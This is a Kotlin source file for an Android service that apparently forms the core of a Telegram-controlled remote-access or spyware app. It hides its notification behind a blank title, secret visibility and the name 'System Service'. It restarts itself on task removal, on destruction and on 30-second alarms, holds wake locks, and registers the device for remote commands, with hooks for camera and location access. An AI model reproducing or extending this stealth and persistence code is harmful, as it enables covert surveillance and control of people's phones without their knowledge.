package com.fasonbot.app.service

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.fasonbot.app.R
import com.fasonbot.app.bot.TelegramBot
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.receiver.ServiceRestartReceiver
import java.util.concurrent.atomic.AtomicBoolean

class CoreService : Service() {

    companion object {
        private const val TAG = "CoreService"
        private const val CHANNEL_ID = "system_service"
        private const val NOTIFICATION_ID = 1001
        private const val RESTART_REQUEST_CODE = 1002
        private const val ALARM_INTERVAL = 30_000L
        private const val HEARTBEAT_INTERVAL = 10_000L
        private const val WAKE_LOCK_TIMEOUT = 10 * 60 * 1000L // 10 minutes

        const val ACTION_START = "com.fasonbot.app.service.CoreService.START"
        const val ACTION_RESTART = "com.fasonbot.app.service.CoreService.RESTART"
        const val ACTION_STOP = "com.fasonbot.app.service.CoreService.STOP"
        const val ALARM_ACTION = "com.fasonbot.app.service.CoreService.ALARM"

        private val isServiceRunning = AtomicBoolean(false)

        @Volatile
        private var telegramBotInstance: TelegramBot? = null

        @Volatile
        private var serviceInstance: CoreService? = null

        fun isRunning(): Boolean = isServiceRunning.get()

        fun getInstance(): CoreService? = serviceInstance

        fun getTelegramBot(context: Context): TelegramBot {
            return telegramBotInstance ?: synchronized(this) {
                telegramBotInstance ?: TelegramBot(context.applicationContext).also {
                    telegramBotInstance = it
                }
            }
        }

        fun start(context: Context) {
            try {
                val intent = Intent(context, CoreService::class.java).apply { action = ACTION_START }
                // Android 9+ always requires startForegroundService
                ContextCompat.startForegroundService(context, intent)
            } catch (e: Exception) {
                Log.e(TAG, "Start service error: ${e.message}")
                scheduleRestartAlarm(context, 1000)
            }
        }

        fun scheduleRestartAlarm(context: Context, delayMs: Long) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(context, ServiceRestartReceiver::class.java).apply { action = ALARM_ACTION }
                val pendingIntent = PendingIntent.getBroadcast(
                    context, RESTART_REQUEST_CODE, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val triggerTime = SystemClock.elapsedRealtime() + delayMs
                // Android 9+ supports setExactAndAllowWhileIdle
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent
                )
            } catch (e: Exception) {
                Log.e(TAG, "Schedule alarm error: ${e.message}")
            }
        }
    }

    private var telegramBot: TelegramBot? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private val handler = Handler(Looper.getMainLooper())
    private var currentServiceType: Int = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> reconnectIfNeeded()
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        serviceInstance = this
        isServiceRunning.set(true)
        createNotificationChannel()
        startAsForeground()
        acquireWakeLock()
        registerReceivers()
        startHeartbeat()
        schedulePeriodicAlarms()
        initializeConnection()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_RESTART -> reconnectIfNeeded()
        }
        ensureForeground()
        initializeConnection()
        schedulePeriodicAlarms()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restartIntent = Intent(applicationContext, CoreService::class.java).apply { action = ACTION_RESTART }
            // Android 9+ always uses startForegroundService
            startForegroundService(restartIntent)
        } catch (e: Exception) {
            Log.e(TAG, "Task removed error: ${e.message}")
        }
        scheduleRestartAlarm(applicationContext, 100)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        isServiceRunning.set(false)
        serviceInstance = null
        telegramBot?.stopPolling()
        handler.removeCallbacksAndMessages(null)
        releaseWakeLock()
        unregisterReceivers()
        scheduleRestartAlarm(applicationContext, 500)
        super.onDestroy()
    }

    private fun initializeConnection() {
        try {
            if (!BotConfig.isConfigValid()) {
                Log.w(TAG, "Bot configuration is invalid")
                return
            }

            DeviceManager.registerDevice(applicationContext)
            DeviceManager.updateDeviceStatus(
                applicationContext,
                DeviceManager.getDeviceId(applicationContext),
                true
            )

            if (telegramBot == null) {
                telegramBot = getTelegramBot(applicationContext)
            }

            if (telegramBot?.isConnected() != true) {
                telegramBot?.startPolling()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Connection init error: ${e.message}")
            handler.postDelayed({ initializeConnection() }, 5000)
        }
    }

    private fun createNotificationChannel() {
        // Android 9+ requires notification channel for foreground services
        val channel = NotificationChannel(
            CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Required for app functionality"
            lockscreenVisibility = Notification.VISIBILITY_SECRET
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            setSound(null, null)
        }
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun startAsForeground() {
        val notification = createNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(
                    NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Start foreground error: ${e.message}")
        }
    }

    private fun ensureForeground() {
        try {
            val notification = createNotification()
            val manager = getSystemService(NotificationManager::class.java)
            manager.notify(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Ensure foreground error: ${e.message}")
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setOngoing(true)
            .setSmallIcon(R.drawable.mpt)
            .setContentTitle(" ")
            .setContentText("")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setCustomBigContentView(RemoteViews(packageName, R.layout.notification))
            .build()
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "FasonBot:CoreService"
            ).apply {
                acquire(WAKE_LOCK_TIMEOUT)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Acquire wakelock error: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
            wakeLock = null
        } catch (e: Exception) {
            Log.e(TAG, "Release wakelock error: ${e.message}")
        }
    }

    private fun registerReceivers() {
        try {
            val screenFilter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, screenFilter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(screenReceiver, screenFilter)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Register receiver error: ${e.message}")
        }

        // Android 9+ supports registerDefaultNetworkCallback
        try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    reconnectIfNeeded()
                }
            }
            connectivityManager.registerDefaultNetworkCallback(networkCallback!!)
        } catch (e: Exception) {
            Log.e(TAG, "Network callback error: ${e.message}")
        }
    }

    private fun unregisterReceivers() {
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}

        try {
            networkCallback?.let {
                val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                connectivityManager.unregisterNetworkCallback(it)
            }
        } catch (_: Exception) {}
    }

    private fun startHeartbeat() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (isServiceRunning.get()) {
                    performHeartbeat()
                    handler.postDelayed(this, HEARTBEAT_INTERVAL)
                }
            }
        }, HEARTBEAT_INTERVAL)
    }

    private fun performHeartbeat() {
        ensureForeground()
        // Re-acquire wake lock periodically
        if (wakeLock?.isHeld == false) {
            acquireWakeLock()
        }
        if (telegramBot == null || telegramBot?.isConnected() != true) {
            if (isNetworkAvailable()) {
                initializeConnection()
            }
        }
    }

    private fun schedulePeriodicAlarms() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, ServiceRestartReceiver::class.java).apply { action = ALARM_ACTION }
            val pendingIntent = PendingIntent.getBroadcast(
                this, NOTIFICATION_ID, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + ALARM_INTERVAL,
                ALARM_INTERVAL, pendingIntent
            )
        } catch (e: Exception) {
            Log.e(TAG, "Schedule periodic alarm error: ${e.message}")
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork ?: return false
        val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
               capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
    }

    private fun reconnectIfNeeded() {
        if (isNetworkAvailable()) {
            if (telegramBot == null || telegramBot?.isConnected() != true) {
                initializeConnection()
            }
        }
    }

    /**
     * Update foreground service type for Android 14+.
     * Required when using camera or location features.
     */
    fun updateServiceType(type: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val combined = currentServiceType or type
            if (combined != currentServiceType) {
                currentServiceType = combined
                try {
                    startForeground(NOTIFICATION_ID, createNotification(), currentServiceType)
                    Log.d(TAG, "Service type updated: $currentServiceType")
                } catch (e: Exception) {
                    Log.e(TAG, "Update service type error: ${e.message}")
                }
            }
        }
    }

    /**
     * Release foreground service type for Android 14+.
     * Called when camera or location features are no longer needed.
     */
    fun releaseServiceType(type: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val remaining = currentServiceType and type.inv()
            if (remaining != currentServiceType && remaining != 0) {
                currentServiceType = remaining
                try {
                    startForeground(NOTIFICATION_ID, createNotification(), currentServiceType)
                    Log.d(TAG, "Service type released: $currentServiceType")
                } catch (e: Exception) {
                    Log.e(TAG, "Release service type error: ${e.message}")
                }
            }
        }
    }
}
